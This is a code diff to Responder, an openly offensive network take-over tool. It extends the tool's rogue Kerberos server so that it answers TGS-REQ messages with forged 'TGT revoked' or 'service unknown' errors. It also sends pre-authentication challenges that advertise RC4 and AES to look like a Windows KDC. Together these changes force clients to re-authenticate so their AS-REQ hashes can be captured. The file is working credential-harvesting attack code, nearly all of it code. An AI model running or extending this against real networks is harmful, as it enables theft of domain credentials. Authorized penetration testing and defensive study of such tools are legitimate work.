@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # This file is part of Responder, a network take-over set of tools 
 # created and maintained by Laurent Gaffie.
-# email: lgaffie@secorizon.com
+# email: laurent.gaffie@gmail.com
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
 # the Free Software Foundation, either version 3 of the License, or
@@ -155,9 +155,16 @@ def find_msg_type(data):
 	try:
 		offset = 0
 		
-		# APPLICATION tag [10] for AS-REQ
-		if offset >= len(data) or data[offset] != 0x6a:
+		# Check APPLICATION tag
+		# [10] for AS-REQ (0x6a)
+		# [12] for TGS-REQ (0x6c)
+		if offset >= len(data):
 			return None, False, None, None
+		
+		app_tag = data[offset]
+		if app_tag not in [0x6a, 0x6c]:  # AS-REQ or TGS-REQ
+			return None, False, None, None
+		
 		offset += 1
 		
 		# Parse outer length
@@ -529,8 +536,46 @@ def build_krb_error(error_code, cname, realm):
 		# [10] tag wrapper
 		sname_field = b'\xaa' + encode_asn1_length(len(sname_principal)) + sname_principal
 		
-		# Build inner SEQUENCE in correct order: [0][1][4][5][6][9][10]
-		inner_seq = pvno + msg_type + stime + susec + error_code_bytes + realm_field + sname_field
+		# [11] e-data (only for error 25 - PREAUTH_REQUIRED)
+		edata_field = b''
+		if error_code == 25:
+			# Build ETYPE-INFO2 for supported encryption types
+			# Include salt (realm) to match Windows KDC behavior
+			
+			# Convert realm to UTF-8 for salt
+			salt_bytes = realm.encode('utf-8')
+			salt_field = b'\xa1' + encode_asn1_length(len(salt_bytes) + 2) + b'\x1b' + struct.pack('B', len(salt_bytes)) + salt_bytes
+			
+			# ETYPE-INFO2-ENTRY for AES256 (18) with salt
+			etype_aes256 = b'\x30' + encode_asn1_length(5 + len(salt_field)) + b'\xa0\x03\x02\x01\x12' + salt_field
+			
+			# ETYPE-INFO2-ENTRY for RC4 (23) - RC4 doesn't use salt typically
+			etype_rc4 = b'\x30\x05\xa0\x03\x02\x01\x17'
+			
+			# ETYPE-INFO2-ENTRY for AES128 (17) with salt
+			etype_aes128 = b'\x30' + encode_asn1_length(5 + len(salt_field)) + b'\xa0\x03\x02\x01\x11' + salt_field
+			
+			# SEQUENCE OF ETYPE-INFO2-ENTRY (AES first, then RC4)
+			etype_seq = b'\x30' + encode_asn1_length(len(etype_aes256) + len(etype_rc4) + len(etype_aes128)) + etype_aes256 + etype_rc4 + etype_aes128
+			
+			# PA-DATA for ETYPE-INFO2
+			# [1] padata-type = 19 (PA-ETYPE-INFO2)
+			padata_type = b'\xa1\x03\x02\x01\x13'
+			
+			# [2] padata-value = OCTET STRING containing etype_seq
+			padata_value = b'\xa2' + encode_asn1_length(len(etype_seq) + 2) + b'\x04' + encode_asn1_length(len(etype_seq)) + etype_seq
+			
+			# PA-DATA SEQUENCE
+			padata = b'\x30' + encode_asn1_length(len(padata_type) + len(padata_value)) + padata_type + padata_value
+			
+			# METHOD-DATA is SEQUENCE OF PA-DATA
+			method_data = b'\x30' + encode_asn1_length(len(padata)) + padata
+			
+			# [12] e-data = OCTET STRING containing METHOD-DATA
+			edata_field = b'\xac' + encode_asn1_length(len(method_data) + 2) + b'\x04' + encode_asn1_length(len(method_data)) + method_data
+		
+		# Build inner SEQUENCE in correct order: [0][1][4][5][6][9][10][12]
+		inner_seq = pvno + msg_type + stime + susec + error_code_bytes + realm_field + sname_field + edata_field
 		
 		# Wrap in SEQUENCE
 		sequence = b'\x30' + encode_asn1_length(len(inner_seq)) + inner_seq
@@ -558,12 +603,17 @@ def ParseMSKerbv5UDP(Data):
 		
 		if not valid:
 			if settings.Config.Verbose:
-				print(text('[KERB] UDP invalid AS-REQ structure'))
+				print(text('[KERB] UDP invalid Kerberos structure'))
 			return None, None, None, None
+		
+		if msg_type == 0x0c:  # TGS-REQ
+			if settings.Config.Verbose:
+				print(text('[KERB] UDP received TGS-REQ from %s@%s - forcing re-authentication' % (cname, realm)))
+			return None, 20, cname, realm  # KDC_ERR_TGT_REVOKED
 		
 		if msg_type != 0x0a:
 			if settings.Config.Verbose:
-				print(text('[KERB] UDP not an AS-REQ message (type=%d)' % msg_type))
+				print(text('[KERB] UDP not an AS-REQ or TGS-REQ message (type=%d)' % msg_type))
 			return None, None, None, None
 		
 		if settings.Config.Verbose:
@@ -657,12 +707,17 @@ def ParseMSKerbv5TCP(Data):
 		
 		if not valid:
 			if settings.Config.Verbose:
-				print(text('[KERB] TCP invalid AS-REQ structure'))
+				print(text('[KERB] TCP invalid Kerberos structure'))
 			return None, None, None, None
+		
+		if msg_type == 0x0c:  # TGS-REQ
+			if settings.Config.Verbose:
+				print(text('[KERB] TCP received TGS-REQ from %s@%s - forcing re-authentication' % (cname, realm)))
+			return None, 20, cname, realm  # KDC_ERR_TGT_REVOKED
 		
 		if msg_type != 0x0a:
 			if settings.Config.Verbose:
-				print(text('[KERB] TCP not an AS-REQ message (type=%d)' % msg_type))
+				print(text('[KERB] TCP not an AS-REQ or TGS-REQ message (type=%d)' % msg_type))
 			return None, None, None, None
 		
 		if settings.Config.Verbose:
@@ -794,6 +849,34 @@ class KerbTCP(BaseRequestHandler):
 					print(text('[KERB] TCP sent KRB-ERROR (pre-auth required) to %s' % 
 						self.client_address[0].replace("::ffff:", "")))
 			
+			elif error_code == 7:
+				# Send KRB-ERROR to force re-authentication (TGS-REQ received)
+				krb_error = build_krb_error(7, cname, realm)
+				
+				# Add TCP length prefix (4 bytes)
+				tcp_length = struct.pack('>I', len(krb_error))
+				response = tcp_length + krb_error
+				
+				self.request.send(response)
+				
+				if settings.Config.Verbose:
+					print(text('[KERB] TCP sent KRB-ERROR (service unknown) to force AS-REQ from %s' % 
+						self.client_address[0].replace("::ffff:", "")))
+			
+			elif error_code == 20:
+				# Send KRB-ERROR to invalidate TGT (TGS-REQ received)
+				krb_error = build_krb_error(20, cname, realm)
+				
+				# Add TCP length prefix (4 bytes)
+				tcp_length = struct.pack('>I', len(krb_error))
+				response = tcp_length + krb_error
+				
+				self.request.send(response)
+				
+				if settings.Config.Verbose:
+					print(text('[KERB] TCP sent KRB-ERROR (TGT revoked) to force AS-REQ from %s' % 
+						self.client_address[0].replace("::ffff:", "")))
+			
 			elif settings.Config.Verbose:
 				print(text('[KERB] TCP no hash captured from %s' % 
 					self.client_address[0].replace("::ffff:", "")))
@@ -854,6 +937,26 @@ class KerbUDP(BaseRequestHandler):
 				
 				if settings.Config.Verbose:
 					print(text('[KERB] UDP sent KRB-ERROR (pre-auth required) to %s' % 
+						self.client_address[0].replace("::ffff:", "")))
+			
+			elif error_code == 7:
+				# Send KRB-ERROR to force re-authentication (TGS-REQ received)
+				krb_error = build_krb_error(7, cname, realm)
+				
+				soc.sendto(krb_error, self.client_address)
+				
+				if settings.Config.Verbose:
+					print(text('[KERB] UDP sent KRB-ERROR (service unknown) to force AS-REQ from %s' % 
+						self.client_address[0].replace("::ffff:", "")))
+			
+			elif error_code == 20:
+				# Send KRB-ERROR to invalidate TGT (TGS-REQ received)
+				krb_error = build_krb_error(20, cname, realm)
+				
+				soc.sendto(krb_error, self.client_address)
+				
+				if settings.Config.Verbose:
+					print(text('[KERB] UDP sent KRB-ERROR (TGT revoked) to force AS-REQ from %s' % 
 						self.client_address[0].replace("::ffff:", "")))
 			
 			elif settings.Config.Verbose:
